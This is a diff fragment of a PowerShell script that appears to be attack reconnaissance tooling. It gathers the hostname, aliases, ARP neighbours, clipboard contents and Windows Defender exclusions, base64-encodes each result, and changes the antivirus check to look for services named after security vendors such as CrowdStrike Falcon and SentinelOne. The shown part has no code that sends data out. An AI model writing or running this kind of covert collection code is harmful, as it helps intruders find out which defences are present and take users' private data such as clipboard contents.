@@ -5,7 +5,7 @@ param($Text);if($null -eq $Text){return "IA=="}else{$Bytes=[System.Text.Encoding
 $hostname=Encode64(hostname);
 $commands = @{
 alias = Encode64(Get-ChildItem Alias: | out-string);
-antivirus = Encode64(WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName | out-string);
+antivirus = Encode64(Get-Service | Where-Object { $_.DisplayName -like "*McAfee*" -or $_.DisplayName -like "*Symantec*" -or $_.DisplayName -like "*Kaspersky*" -or $_.DisplayName -like "*Eset*" -or $_.DisplayName -like "*Sentinel*" -or $_.DisplayName -like "*Falcon*" } | out-string);
 arp = Encode64(Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State | out-string);
 clipboard=Encode64(Get-Clipboard | out-string);
 defender_exclusions = Encode64(Get-MpPreference | select Exclusion* | fl | out-string);
